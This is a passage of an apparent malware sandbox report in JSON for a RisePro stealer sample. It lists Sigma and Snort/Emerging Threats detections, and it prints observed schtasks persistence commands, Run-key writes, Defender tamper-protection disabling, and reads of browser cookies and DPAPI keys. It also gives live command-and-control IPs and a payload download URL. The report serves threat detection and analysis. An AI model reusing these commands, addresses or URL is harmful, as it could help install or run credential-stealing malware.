          "rule_author": "Florian Roth (Nextron Systems), @0xrawsec"
        },
        {
          "match_context": [
            {
              "values": {
                "EventID": "1",
                "Product": "Microsoft\\xae Windows\\xae Operating System",
                "ParentImage": "C:\\Users\\george\\AppData\\Local\\Temp\\d887ceb89d\\explorhe.exe",
                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                "CurrentDirectory": "C:\\Users\\george\\AppData\\Local\\Temp\\jobA4grSpwVFs_AHrd\\",
                "Image": "C:\\Windows\\SysWOW64\\schtasks.exe",
                "IntegrityLevel": "High",
                "ParentCommandLine": "\"C:\\Users\\george\\AppData\\Local\\Temp\\d887ceb89d\\explorhe.exe\" ",
                "CommandLine": "\"C:\\Windows\\System32\\schtasks.exe\" /Create /SC MINUTE /MO 1 /TN explorhe.exe /TR \"C:\\Users\\george\\AppData\\Local\\Temp\\d887ceb89d\\explorhe.exe\" /F",
                "Hashes": "SHA1=BBE6394229CE3A53ECCD2CB4CEA6EE41134EFDA9,MD5=15FF7D8324231381BAD48A052F85DF04,SHA256=7949EDDF437FED5F45564402B26E4D457EA666D1361A7C4F07D830BE233A4F72,IMPHASH=FC93D9248DEA161B2E724C188AECD07D",
                "Company": "Microsoft Corporation",
                "OriginalFileName": "schtasks.exe",
                "Description": "Task Scheduler Configuration Tool"
              }
            }
          ],
          "rule_level": "medium",
          "rule_description": "Detects suspicious scheduled task creations from a parent stored in a temporary folder",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "rule_title": "Suspicious Add Scheduled Task Parent",
          "rule_id": "66d80afb92c9db3881829096827fcacc7b8a697c3ceeb3318163ce83367f394b",
          "rule_author": "Florian Roth (Nextron Systems)"
        },
        {
          "match_context": [
            {
              "values": {
                "FileName": "%APPDATA%\\mozilla\\firefox\\profiles\\yfwt7ezn.default-release-1\\cookies.sqlite"
              }
            },
            {
              "values": {
                "FileName": "%APPDATA%\\mozilla\\firefox\\profiles\\0j9e9tku.default-release\\cookies.sqlite"
              }
            },
            {
              "values": {
                "FileName": "%APPDATA%\\thunderbird\\profiles\\npsdfqy3.default-release\\cookies.sqlite"
              }
            },
            {
              "values": {
                "FileName": "%APPDATA%\\mozilla\\firefox\\profiles\\v08trqk6.default-release\\cookies.sqlite"
              }
            },
            {
              "values": {
                "FileName": "%APPDATA%\\thunderbird\\profiles\\chdgbv82.default-release\\cookies.sqlite"
              }
            }
          ],
          "rule_level": "medium",
          "rule_description": "Detects file access requests to browser credential stores by uncommon processes.\nCould indicate potential attempt of credential stealing.\nRequires heavy baselining before usage\n",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "rule_title": "Access To Browser Credential Files By Uncommon Application",
          "rule_id": "74ea3fde96df11352e7b3c70bce437f83f170b5677efeb447c7f33d001142691",
          "rule_author": "frack113"
        },
        {
          "match_context": [
            {
              "values": {
                "DestinationHostname": "ipinfo.io",
                "DestinationPort": "443",
                "DestinationIp": "34.117.186.192",
                "Initiated": "true"
              }
            },
            {
              "values": {
                "DestinationHostname": "db-ip.com",
                "Initiated": "true",
                "DestinationPort": "443",
                "DestinationIp": "172.67.75.166"
              }
            },
            {
              "values": {
                "DestinationHostname": "db-ip.com",
                "Initiated": "true",
                "DestinationPort": "443",
                "DestinationIp": "104.26.4.15"
              }
            }
          ],
          "rule_level": "medium",
          "rule_description": "Detects external IP address lookups by non-browser processes via services such as \"api.ipify.org\". This could be indicative of potential post compromise internet test activity.",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "rule_title": "Suspicious Network Connection to IP Lookup Service APIs",
          "rule_id": "7b06f86400ae084ca05c7e2cefe70b8ea4910b6196d969ae516b9d5d1c99bfe5",
          "rule_author": "Janantha Marasinghe, Nasreddine Bencherchali (Nextron Systems)"
        },
        {
          "match_context": [
            {
              "values": {
                "EventID": "13",
                "EventType": "SetValue",
                "Image": "C:\\Users\\george\\Desktop\\lada.exe",
                "Details": "C:\\Users\\george\\AppData\\Local\\RageMP131\\RageMP131.exe",
                "TargetObject": "HKU\\S-1-5-21-1015118539-3749460369-599379286-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\RageMP131"
              }
            },
            {
              "values": {
                "EventID": "13",
                "EventType": "SetValue",
                "Details": "%LOCALAPPDATA%\\RageMP131\\RageMP131.exe",
                "TargetObject": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\RageMP131"
              }
            }
          ],
          "rule_level": "medium",
          "rule_description": "Detects modification of autostart extensibility point (ASEP) in registry.",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "rule_title": "CurrentVersion Autorun Keys Modification",
          "rule_id": "8b5db9da5732dc549b0e8b56fe5933d7c95ed760f3ac20568ab95347ef8c5bcc",
          "rule_author": "Victor Sergeev, Daniil Yugoslavskiy, Gleb Sukhodolskiy, Timur Zinniatullin, oscd.community, Tim Shelton, frack113 (split)"
        },
        {
          "match_context": [
            {
              "values": {
                "EventID": "13",
                "EventType": "SetValue",
                "Image": "C:\\Users\\george\\AppData\\Local\\Temp\\jobA4grSpwVFs_AHrd\\3TaSr4LqCIy1x393n7Nm.exe",
                "Details": "DWORD (0x00000000)",
                "TargetObject": "HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows Defender\\Features\\TamperProtection"
              }
            }
          ],
          "rule_level": "medium",
          "rule_description": "Detects disabling Windows Defender Tamper Protection",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "rule_title": "Disable Tamper Protection on Windows Defender",
          "rule_id": "bf1de3b61466c6018ee71be3f901fb544ddb30709a256ce88ddc19444b5a1ea1",
          "rule_author": "Austin Songer @austinsonger"
        },
        {
          "match_context": [
            {
              "values": {
                "EventID": "1",
                "Product": "Microsoft\\xae Windows\\xae Operating System",
                "Company": "Microsoft Corporation",
                "ParentImage": "C:\\Users\\george\\Desktop\\lada.exe",
                "Description": "Task Scheduler Configuration Tool",
                "CurrentDirectory": "C:\\Users\\george\\Desktop\\",
                "Image": "C:\\Windows\\SysWOW64\\schtasks.exe",
                "IntegrityLevel": "High",
                "ParentCommandLine": "\"C:\\Users\\george\\Desktop\\lada.exe\"",
                "Hashes": "SHA1=BBE6394229CE3A53ECCD2CB4CEA6EE41134EFDA9,MD5=15FF7D8324231381BAD48A052F85DF04,SHA256=7949EDDF437FED5F45564402B26E4D457EA666D1361A7C4F07D830BE233A4F72,IMPHASH=FC93D9248DEA161B2E724C188AECD07D",
                "CommandLine": "schtasks /create /f /RU \"george\" /tr \"C:\\ProgramData\\MPGPH131\\MPGPH131.exe\" /tn \"MPGPH131 LG\" /sc ONLOGON /rl HIGHEST",
                "OriginalFileName": "schtasks.exe",
                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)"
              }
            }
          ],
          "rule_level": "medium",
          "rule_description": "Detects scheduled task creations or modification to be run with high privileges on a suspicious schedule type",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "rule_title": "Suspicious Schtasks Schedule Type With High Privileges",
          "rule_id": "e36b579d4bc4ef49ede1d82dd08ec1cba660d105c6f037d12ecf79b434617e88",
          "rule_author": "Nasreddine Bencherchali (Nextron Systems)"
        },
        {
          "match_context": [
            {
              "values": {
                "FileName": "%WINDIR%\\system32\\microsoft\\protect\\s-1-5-18\\user\\preferred"
              }
            },
            {
              "values": {
                "FileName": "%APPDATA%\\microsoft\\protect\\s-1-5-21-1238866942-1249195528-555854008-1000\\preferred"
              }
            },
            {
              "values": {
                "FileName": "%APPDATA%\\microsoft\\protect\\s-1-5-21-3150914307-1777937420-491476919-1000\\preferred"
              }
            }
          ],
          "rule_level": "medium",
          "rule_description": "Detects file access requests to the the Windows Data Protection API Master keys by an uncommon application.\nThis can be a sign of credential stealing. Example case would be usage of mimikatz \"dpapi::masterkey\" function\n",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "rule_title": "Access To Windows DPAPI Master Keys By Uncommon Application",
          "rule_id": "ec1d4770fddf21948d437ee8ade88904c7b95601bf83cfe214687e2611dd530c",
          "rule_author": "Nasreddine Bencherchali (Nextron Systems)"
        },
        {
          "match_context": [
            {
              "values": {
                "EventID": "1",
                "Product": "Microsoft\\xae Windows\\xae Operating System",
                "ParentImage": "C:\\Users\\george\\Desktop\\lada.exe",
                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                "CurrentDirectory": "C:\\Users\\george\\Desktop\\",
                "Image": "C:\\Windows\\SysWOW64\\schtasks.exe",
                "Company": "Microsoft Corporation",
                "IntegrityLevel": "High",
                "ParentCommandLine": "\"C:\\Users\\george\\Desktop\\lada.exe\"",
                "Hashes": "SHA1=BBE6394229CE3A53ECCD2CB4CEA6EE41134EFDA9,MD5=15FF7D8324231381BAD48A052F85DF04,SHA256=7949EDDF437FED5F45564402B26E4D457EA666D1361A7C4F07D830BE233A4F72,IMPHASH=FC93D9248DEA161B2E724C188AECD07D",
                "CommandLine": "schtasks /create /f /RU \"george\" /tr \"C:\\ProgramData\\MPGPH131\\MPGPH131.exe\" /tn \"MPGPH131 HR\" /sc HOURLY /rl HIGHEST",
                "OriginalFileName": "schtasks.exe",
                "Description": "Task Scheduler Configuration Tool"
              }
            },
            {
              "values": {
                "EventID": "1",
                "Product": "Microsoft\\xae Windows\\xae Operating System",
                "ParentImage": "C:\\Users\\george\\Desktop\\lada.exe",
                "Description": "Task Scheduler Configuration Tool",
                "CurrentDirectory": "C:\\Users\\george\\Desktop\\",
                "Company": "Microsoft Corporation",
                "IntegrityLevel": "High",
                "ParentCommandLine": "\"C:\\Users\\george\\Desktop\\lada.exe\"",
                "CommandLine": "schtasks /create /f /RU \"george\" /tr \"C:\\ProgramData\\MPGPH131\\MPGPH131.exe\" /tn \"MPGPH131 LG\" /sc ONLOGON /rl HIGHEST",
                "Hashes": "SHA1=BBE6394229CE3A53ECCD2CB4CEA6EE41134EFDA9,MD5=15FF7D8324231381BAD48A052F85DF04,SHA256=7949EDDF437FED5F45564402B26E4D457EA666D1361A7C4F07D830BE233A4F72,IMPHASH=FC93D9248DEA161B2E724C188AECD07D",
                "Image": "C:\\Windows\\SysWOW64\\schtasks.exe",
                "OriginalFileName": "schtasks.exe",
                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)"
              }
            },
            {
              "values": {
                "EventID": "1",
                "Product": "Microsoft\\xae Windows\\xae Operating System",
                "ParentImage": "C:\\Users\\george\\AppData\\Local\\Temp\\d887ceb89d\\explorhe.exe",
                "Description": "Task Scheduler Configuration Tool",
                "CurrentDirectory": "C:\\Users\\george\\AppData\\Local\\Temp\\jobA4grSpwVFs_AHrd\\",
                "Company": "Microsoft Corporation",
                "IntegrityLevel": "High",
                "ParentCommandLine": "\"C:\\Users\\george\\AppData\\Local\\Temp\\d887ceb89d\\explorhe.exe\" ",
                "CommandLine": "\"C:\\Windows\\System32\\schtasks.exe\" /Create /SC MINUTE /MO 1 /TN explorhe.exe /TR \"C:\\Users\\george\\AppData\\Local\\Temp\\d887ceb89d\\explorhe.exe\" /F",
                "Hashes": "SHA1=BBE6394229CE3A53ECCD2CB4CEA6EE41134EFDA9,MD5=15FF7D8324231381BAD48A052F85DF04,SHA256=7949EDDF437FED5F45564402B26E4D457EA666D1361A7C4F07D830BE233A4F72,IMPHASH=FC93D9248DEA161B2E724C188AECD07D",
                "Image": "C:\\Windows\\SysWOW64\\schtasks.exe",
                "OriginalFileName": "schtasks.exe",
                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)"
              }
            }
          ],
          "rule_level": "low",
          "rule_description": "Detects the creation of scheduled tasks in user session",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "rule_title": "Scheduled Task Creation",
          "rule_id": "3bc9d14114a6b67367a24df21134d0564d6f08a0ad903d68f9b25e9d8b7f0790",
          "rule_author": "Florian Roth (Nextron Systems)"
        }
      ],
      "tlsh": "T1F6B533F13578241CF9CB17FA1151A18969E37C57A92635DAA7D3F3C183BE2B3A861C10",
      "sigma_analysis_summary": {
        "Sigma Integrated Rule Set (GitHub)": {
          "high": 4,
          "medium": 12,
          "critical": 0,
          "low": 1
        }
      },
      "md5": "cab8183a94bb10ab3d1bffefa7db38e2",
      "trid": [
        {
          "file_type": "Win16 NE executable (generic)",
          "probability": 32.3
        },
        {
          "file_type": "Win32 Executable (generic)",
          "probability": 28.9
        },
        {
          "file_type": "OS/2 Executable (generic)",
          "probability": 13
        },
        {
          "file_type": "Generic Win/DOS Executable",
          "probability": 12.8
        },
        {
          "file_type": "DOS Executable Generic",
          "probability": 12.8
        }
      ],
      "first_submission_date": 1706482587,
      "crowdsourced_ids_results": [
        {
          "rule_category": "policy-violation",
          "alert_severity": "high",
          "rule_msg": "FILE-EXECUTABLE download of executable content",
          "rule_raw": "alert tcp $EXTERNAL_NET $HTTP_PORTS -> $HOME_NET any ( msg:\"FILE-EXECUTABLE download of executable content\"; flow:to_client,established; http_header; content:\"application/octet-stream\",fast_pattern,nocase; pcre:\"/^Content-Type\\x3a[\\x20\\x09]+application\\/octet-stream/ims\"; file_data; content:\"MZ\",within 2; metadata:policy max-detect-ips drop; service:http; reference:url,www.microsoft.com/smallbusiness/resources/technology/security/practice_safe_computing_and_thwart_online_thugs.mspx; classtype:policy-violation; sid:11192; rev:20; )",
          "alert_context": [
            {
              "src_ip": "109.107.182.3",
              "src_port": 80
            }
          ],
          "rule_url": "https://www.snort.org/downloads/#rule-downloads",
          "rule_source": "Snort registered user ruleset",
          "rule_references": [
            "https://www.microsoft.com/smallbusiness/resources/technology/security/practice_safe_computing_and_thwart_online_thugs.mspx"
          ],
          "rule_id": "1:11192"
        },
        {
          "rule_category": "policy-violation",
          "alert_severity": "high",
          "rule_msg": "FILE-EXECUTABLE Portable Executable binary file magic detected",
          "rule_raw": "alert tcp $EXTERNAL_NET $FILE_DATA_PORTS -> $HOME_NET any ( msg:\"FILE-EXECUTABLE Portable Executable binary file magic detected\"; flow:to_client,established; file_data; content:\"MZ\"; byte_jump:4,58,relative,little; content:\"PE|00 00|\",within 4,distance -64; metadata:policy max-detect-ips drop; service:ftp-data,http,imap,pop3; classtype:policy-violation; sid:15306; rev:22; )",
          "alert_context": [
            {
              "src_ip": "109.107.182.3",
              "src_port": 80
            }
          ],
          "rule_url": "https://www.snort.org/downloads/#rule-downloads",
          "rule_source": "Snort registered user ruleset",
          "rule_id": "1:15306"
        },
        {
          "rule_category": "Malware Command and Control Activity Detected",
          "alert_severity": "high",
          "rule_msg": "ET MALWARE [ANY.RUN] RisePro TCP v.0.x (Token)",
          "rule_raw": "alert tcp $EXTERNAL_NET ![80,443,5938] -> $HOME_NET any (msg:\"ET MALWARE [ANY.RUN] RisePro TCP v.0.x (Token)\"; flow:established,to_client; stream_size:server,=,37; dsize:36; content:\"|18 00 00 00 12 27 00 00|\"; offset:4; depth:8; reference:md5,a1f3423e231abd59d45b2ec37f751bbc; reference:url,app.any.run/tasks/d4c145cc-6a2d-4512-9cd6-555f0f2e17ed; classtype:command-and-control; sid:2046266; rev:2; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, created_at 2023_06_14, deployment Perimeter, former_category MALWARE, malware_family RisePro, performance_impact Low, confidence High, signature_severity Major, updated_at 2023_06_16, reviewed_at 2023_08_21; target:dest_ip;)",
          "alert_context": [
            {
              "src_ip": "193.233.132.62",
              "src_port": 50500
            }
          ],
          "rule_url": "https://rules.emergingthreats.net/",
          "rule_source": "Proofpoint Emerging Threats Open",
          "rule_references": [
            "https://www.virustotal.com/gui/search/a1f3423e231abd59d45b2ec37f751bbc",
            "https://app.any.run/tasks/d4c145cc-6a2d-4512-9cd6-555f0f2e17ed"
          ],
          "rule_id": "1:2046266"
        },
        {
          "rule_category": "Malware Command and Control Activity Detected",
          "alert_severity": "high",
          "rule_msg": "ET MALWARE [ANY.RUN] RisePro TCP v.0.x (External IP)",
          "rule_raw": "alert tcp $EXTERNAL_NET ![80,443,5938] -> $HOME_NET any (msg:\"ET MALWARE [ANY.RUN] RisePro TCP v.0.x (External IP)\"; flow:established,to_client; dsize:19<>29; content:\"|00 00 00 21 27 00 00|\"; offset:5; depth:8; reference:md5,a1f3423e231abd59d45b2ec37f751bbc; reference:url,app.any.run/tasks/d4c145cc-6a2d-4512-9cd6-555f0f2e17ed; classtype:command-and-control; sid:2046267; rev:2; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, created_at 2023_06_14, deployment Perimeter, former_category MALWARE, malware_family RisePro, performance_impact Low, confidence High, signature_severity Major, updated_at 2023_06_16, reviewed_at 2023_08_21; target:dest_ip;)",
          "alert_context": [
            {
              "src_ip": "193.233.132.62",
              "src_port": 50500
            }
          ],
          "rule_url": "https://rules.emergingthreats.net/",
          "rule_source": "Proofpoint Emerging Threats Open",
          "rule_references": [
            "https://www.virustotal.com/gui/search/a1f3423e231abd59d45b2ec37f751bbc",
            "https://app.any.run/tasks/d4c145cc-6a2d-4512-9cd6-555f0f2e17ed"
          ],
          "rule_id": "1:2046267"
        },
        {
          "rule_category": "Malware Command and Control Activity Detected",
          "alert_severity": "high",
          "rule_msg": "ET MALWARE [ANY.RUN] RisePro TCP v.0.x (Activity)",
          "rule_raw": "alert tcp $HOME_NET any -> $EXTERNAL_NET ![80,443,5938] (msg:\"ET MALWARE [ANY.RUN] RisePro TCP v.0.x (Activity)\"; flow:established,to_server; dsize:12; content:\"|00 00 00 00 10 27 00 00|\"; offset:4; depth:8; reference:md5,a1f3423e231abd59d45b2ec37f751bbc; reference:url,app.any.run/tasks/d4c145cc-6a2d-4512-9cd6-555f0f2e17ed; classtype:command-and-control; sid:2046269; rev:2; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, created_at 2023_06_14, deployment Perimeter, former_category MALWARE, malware_family RisePro, performance_impact Low, confidence High, signature_severity Major, updated_at 2023_06_16, reviewed_at 2023_08_21; target:src_ip;)",
          "alert_context": [
            {
              "dest_port": 50500,
              "dest_ip": "193.233.132.62"
            }
          ],
          "rule_url": "https://rules.emergingthreats.net/",
          "rule_source": "Proofpoint Emerging Threats Open",
          "rule_references": [
            "https://www.virustotal.com/gui/search/a1f3423e231abd59d45b2ec37f751bbc",
            "https://app.any.run/tasks/d4c145cc-6a2d-4512-9cd6-555f0f2e17ed"
          ],
          "rule_id": "1:2046269"
        },
        {
          "rule_category": "Malware Command and Control Activity Detected",
          "alert_severity": "high",
          "rule_msg": "ET MALWARE [ANY.RUN] RisePro TCP v.0.x (Exfiltration)",
          "rule_raw": "alert tcp $HOME_NET any -> $EXTERNAL_NET ![80,443,445,5938] (msg:\"ET MALWARE [ANY.RUN] RisePro TCP v.0.x (Exfiltration)\"; flow:established,to_server; dsize:>1100; content:\"|00 1F 27 00 00|\"; offset:7; depth:5; reference:md5,a1f3423e231abd59d45b2ec37f751bbc; reference:url,app.any.run/tasks/d4c145cc-6a2d-4512-9cd6-555f0f2e17ed; classtype:command-and-control; sid:2046270; rev:3; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, created_at 2023_06_14, deployment Perimeter, former_category MALWARE, malware_family RisePro, performance_impact Low, confidence High, signature_severity Major, updated_at 2023_06_23, reviewed_at 2023_10_06; target:src_ip;)",
          "alert_context": [
            {
              "dest_port": 50500,
              "dest_ip": "193.233.132.62"
            }
          ],
          "rule_url": "https://rules.emergingthreats.net/",
          "rule_source": "Proofpoint Emerging Threats Open",
          "rule_references": [
            "https://www.virustotal.com/gui/search/a1f3423e231abd59d45b2ec37f751bbc",
            "https://app.any.run/tasks/d4c145cc-6a2d-4512-9cd6-555f0f2e17ed"
          ],
          "rule_id": "1:2046270"
        },
        {
          "rule_category": "A Network Trojan was detected",
          "alert_severity": "high",
          "rule_msg": "ET MALWARE Suspected RisePro TCP Heartbeat Packet",
          "rule_raw": "alert tcp-pkt $HOME_NET any -> $EXTERNAL_NET 1024: (msg:\"ET MALWARE Suspected RisePro TCP Heartbeat Packet\"; flow:established,to_server; dsize:11<>16; content:\"|ad da ba ab|\"; startswith; fast_pattern; content:\"|27 00 00|\"; distance:5; within:3; threshold:type both,track by_src, count 1, seconds 30; reference:md5,dbd32d02e980ceffdce16697edd62673; classtype:trojan-activity; sid:2049060; rev:1; metadata:attack_target Client_Endpoint, created_at 2023_11_03, deployment Perimeter, former_category MALWARE, performance_impact Low, confidence Medium, signature_severity Major, updated_at 2023_11_03, reviewed_at 2023_11_03; target:src_ip;)",
          "alert_context": [
            {
              "dest_port": 50500,
              "dest_ip": "193.233.132.62"
            }
          ],
          "rule_url": "https://rules.emergingthreats.net/",
          "rule_source": "Proofpoint Emerging Threats Open",
          "rule_references": [
            "https://www.virustotal.com/gui/search/dbd32d02e980ceffdce16697edd62673"
          ],
          "rule_id": "1:2049060"
        },
        {
          "rule_category": "attempted-user",
          "alert_severity": "high",
          "rule_msg": "FILE-OTHER heapspray characters detected - binary",
          "rule_raw": "alert tcp $EXTERNAL_NET $FILE_DATA_PORTS -> $HOME_NET any ( msg:\"FILE-OTHER heapspray characters detected - binary\"; flow:to_client,established; flowbits:isnotset,file.jpeg; file_data; content:\"|0C 0C 0C 0C 0C 0C 0C 0C|\",fast_pattern,nocase; metadata:policy max-detect-ips drop; service:ftp-data,http,imap,pop3; classtype:attempted-user; sid:23861; rev:11; )",
          "alert_context": [
            {
              "src_ip": "109.107.182.3",
              "src_port": 80
            }
          ],
          "rule_url": "https://www.snort.org/downloads/#rule-downloads",
          "rule_source": "Snort registered user ruleset",
          "rule_id": "1:23861"
        },
        {
          "rule_category": "policy-violation",
          "alert_severity": "high",
          "rule_msg": "POLICY-OTHER AutoItv3 Aut2Exe interpreter - compiled script",
          "rule_raw": "alert tcp $EXTERNAL_NET $FILE_DATA_PORTS -> $HOME_NET any ( msg:\"POLICY-OTHER AutoItv3 Aut2Exe interpreter - compiled script\"; flow:to_client,established; flowbits:isset,file.exe; file_data; content:\"|A3 48 4B BE 98 6C 4A A9 99 4C 53 0A 86 D6 48 7D|\",fast_pattern,nocase; content:\"AU3!EA0\"; service:ftp-data,http,imap,pop3; reference:url,autoitscript.com/autoit3/docs/intro/compiler.htm; reference:url,blog.didierstevens.com/2007/10/02/autoit-malware-revisited/; classtype:policy-violation; sid:40028; rev:3; )",
          "alert_context": [
            {
              "src_ip": "109.107.182.3",
              "src_port": 80
            }
          ],
          "rule_url": "https://www.snort.org/downloads/#rule-downloads",
          "rule_source": "Snort registered user ruleset",
          "rule_references": [
            "https://autoitscript.com/autoit3/docs/intro/compiler.htm",
            "https://blog.didierstevens.com/2007/10/02/autoit-malware-revisited/"
          ],
          "rule_id": "1:40028"
        },
        {
          "rule_category": "policy-violation",
          "alert_severity": "high",
          "rule_msg": "POLICY-OTHER HTTP request by IPv4 address attempt",
          "rule_raw": "alert tcp any any -> any $HTTP_PORTS ( msg:\"POLICY-OTHER HTTP request by IPv4 address attempt\"; flow:to_server,established; http_header; content:\"Host:\",fast_pattern,nocase; pcre:\"/^Host\\x3a\\s*(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9]?[0-9])\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9]?[0-9])\\s*:?\\s*\\d*\\s*$/ims\"; service:http; reference:url,www.w3.org/Protocols/rfc2616/rfc2616-sec15.html; classtype:policy-violation; sid:50447; rev:1; )",
          "alert_context": [
            {
              "dest_port": 80,
              "dest_ip": "109.107.182.3"
            }
          ],
          "rule_url": "https://www.snort.org/downloads/#rule-downloads",
          "rule_source": "Snort registered user ruleset",
          "rule_references": [
            "https://www.w3.org/Protocols/rfc2616/rfc2616-sec15.html"
          ],
          "rule_id": "1:50447"
        },
        {
          "rule_category": "Device Retrieving External IP Address Detected",
          "alert_severity": "medium",
          "rule_msg": "ET POLICY Possible External IP Lookup SSL Cert Observed (ipinfo.io)",
          "rule_raw": "alert tls $EXTERNAL_NET any -> $HOME_NET any (msg:\"ET POLICY Possible External IP Lookup SSL Cert Observed (ipinfo.io)\"; flow:from_server,established; tls.cert_subject; content:\"CN=ipinfo.io\"; nocase; endswith; classtype:external-ip-check; sid:2025330; rev:4; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, affected_product Mac_OSX, affected_product Linux, attack_target Client_Endpoint, created_at 2018_02_07, deployment Perimeter, former_category POLICY, performance_impact Low, signature_severity Minor, updated_at 2020_09_16;)",
          "alert_context": [
            {
              "src_ip": "34.117.186.192",
              "src_port": 443,
              "ja3": [
                "ce5f3254611a8c095a3d821d44539877"
              ],
              "ja3s": [
                "b44baa8a20901c5663b3a9664ba8a767"
              ]
            }
          ],
          "rule_url": "https://rules.emergingthreats.net/",
          "rule_source": "Proofpoint Emerging Threats Open",
          "rule_id": "1:2025330"
        },
        {
          "rule_category": "Device Retrieving External IP Address Detected",
          "alert_severity": "medium",
          "rule_msg": "ET POLICY Possible External IP Lookup Domain Observed in SNI (ipinfo. io)",
          "rule_raw": "alert tls $HOME_NET any -> $EXTERNAL_NET 443 (msg:\"ET POLICY Possible External IP Lookup Domain Observed in SNI (ipinfo. io)\"; flow:established,to_server; tls.sni; content:\"ipinfo.io\"; bsize:9; fast_pattern; classtype:external-ip-check; sid:2025331; rev:4; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, affected_product Mac_OSX, affected_product Linux, attack_target Client_Endpoint, created_at 2018_02_07, deployment Perimeter, former_category POLICY, performance_impact Low, signature_severity Minor, updated_at 2022_03_24;)",
          "alert_context": [
            {
              "dest_port": 443,
              "ja3": [
                "1d095e68489d3c535297cd8dffb06cb9"
              ],
              "dest_ip": "34.117.186.192"
            },
            {
              "ja3s": [
                "b44baa8a20901c5663b3a9664ba8a767"
              ],
              "dest_port": 443,
              "ja3": [
                "ce5f3254611a8c095a3d821d44539877"
              ],
              "dest_ip": "34.117.186.192"
            }
          ],
          "rule_url": "https://rules.emergingthreats.net/",
          "rule_source": "Proofpoint Emerging Threats Open",
          "rule_id": "1:2025331"
        },
        {
          "rule_category": "Misc Attack",
          "alert_severity": "medium",
          "rule_msg": "ET DROP Spamhaus DROP Listed Traffic Inbound group 21",
          "rule_raw": "alert ip [185.127.68.0/22,185.127.76.0/22,185.129.8.0/22,185.129.208.0/22,185.130.36.0/22,185.132.8.0/22,185.134.48.0/22,185.144.180.0/22,185.147.140.0/22,185.161.148.0/22,185.165.24.0/22,185.189.73.0/24,185.193.90.0/24,185.215.113.0/24,185.215.132.0/22,185.230.44.0/22,185.232.45.0/24,185.237.104.0/22,185.237.226.0/23,185.238.176.0/22] any -> $HOME_NET any (msg:\"ET DROP Spamhaus DROP Listed Traffic Inbound group 21\"; reference:url,www.spamhaus.org/drop/drop.lasso; threshold: type limit, track by_src, seconds 3600, count 1; classtype:misc-attack; flowbits:set,ET.Evil; flowbits:set,ET.DROPIP; sid:2400020; rev:3802; metadata:affected_product Any, attack_target Any, deployment Perimeter, tag Dshield, signature_severity Minor, created_at 2010_12_30, updated_at 2023_11_15;)",
          "alert_context": [
            {
              "src_ip": "185.215.113.68",
              "src_port": 80
            }
          ],
          "rule_url": "https://rules.emergingthreats.net/",
          "rule_source": "Proofpoint Emerging Threats Open",
          "rule_references": [
            "https://www.spamhaus.org/drop/drop.lasso"
          ],
          "rule_id": "1:2400020"
        },
        {
          "rule_category": "successful-recon-limited",
          "alert_severity": "medium",
          "rule_msg": "PROTOCOL-ICMP Unusual PING detected",
          "rule_raw": "alert icmp $HOME_NET any -> $EXTERNAL_NET any ( msg:\"PROTOCOL-ICMP Unusual PING detected\"; icode:0; itype:8; fragbits:!M; content:!\"ABCDEFGHIJKLMNOPQRSTUVWABCDEFGHI\",depth 32; content:!\"0123456789abcdefghijklmnopqrstuv\",depth 32; content:!\"EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE\",depth 36; content:!\"WANG2\"; content:!\"cacti-monitoring-system\",depth 65; content:!\"SolarWinds\",depth 72; metadata:policy max-detect-ips drop,ruleset community; reference:url,krebsonsecurity.com/2014/01/a-closer-look-at-the-target-malware-part-ii/; reference:url,krebsonsecurity.com/2014/01/a-first-look-at-the-target-intrusion-malware/; classtype:successful-recon-limited; sid:29456; rev:3; )",
          "rule_url": "https://www.snort.org/downloads/#rule-downloads",
          "rule_source": "Snort registered user ruleset",
          "rule_references": [
            "https://krebsonsecurity.com/2014/01/a-closer-look-at-the-target-malware-part-ii/",
            "https://krebsonsecurity.com/2014/01/a-first-look-at-the-target-intrusion-malware/"
          ],
          "rule_id": "1:29456"
        },
        {
          "rule_category": "unknown",
          "alert_severity": "low",
          "rule_msg": "(http_inspect) invalid status line",
          "rule_raw": "alert ( gid:119; sid:279; rev:1; msg:\"(http_inspect) invalid status line\"; metadata: rule-type preproc; classtype:unknown;)",
          "alert_context": [
            {
              "dest_port": 80,
              "dest_ip": "185.215.113.68"
            }
          ],
          "rule_url": "https://www.snort.org/downloads/#rule-downloads",
          "rule_source": "Snort registered user ruleset",
          "rule_id": "119:279"
        },
        {
          "rule_category": "Misc activity",
          "alert_severity": "low",
          "rule_msg": "ET INFO Packed Executable Download",
          "rule_raw": "alert http $EXTERNAL_NET any -> $HOME_NET any (msg:\"ET INFO Packed Executable Download\"; flow:established,to_client; content:\"|0d 0a 0d 0a|MZ\"; isdataat:100,relative; content:\"This program \"; distance:0; content:\"PE|00 00|\"; distance:0; content:!\"data\"; within:400; content:!\"text\"; within:400; content:!\"rsrc\"; within:400; classtype:misc-activity; sid:2014819; rev:4; metadata:created_at 2012_05_30, former_category INFO, signature_severity Informational, updated_at 2012_05_30;)",
          "alert_context": [
            {
              "src_ip": "185.215.113.68",
              "url": "http://185.215.113.68/mine/amers.exe",
              "hostname": "185.215.113.68",
